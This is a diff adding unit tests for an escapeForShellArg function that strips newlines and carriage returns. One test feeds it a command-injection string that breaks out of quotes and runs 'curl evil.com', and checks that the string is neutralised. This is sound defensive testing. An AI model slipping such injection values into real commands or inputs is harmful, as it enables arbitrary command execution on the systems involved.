@@ -245,4 +245,19 @@ describe("escapeForShellArg", () => {
     expect(escapeForShellArg("Fix bug #42")).toBe("Fix bug #42");
     expect(escapeForShellArg("feat: add login")).toBe("feat: add login");
   });
+
+  it("replaces newlines with spaces", () => {
+    expect(escapeForShellArg("line1\nline2\nline3")).toBe("line1 line2 line3");
+  });
+
+  it("removes carriage returns", () => {
+    expect(escapeForShellArg("line1\r\nline2")).toBe("line1 line2");
+  });
+
+  it("handles mixed newline injection attempt", () => {
+    const malicious = 'label1\n"; curl evil.com; echo "';
+    const result = escapeForShellArg(malicious);
+    expect(result).not.toContain("\n");
+    expect(result).toBe('label1 \\"; curl evil.com; echo \\"');
+  });
 });
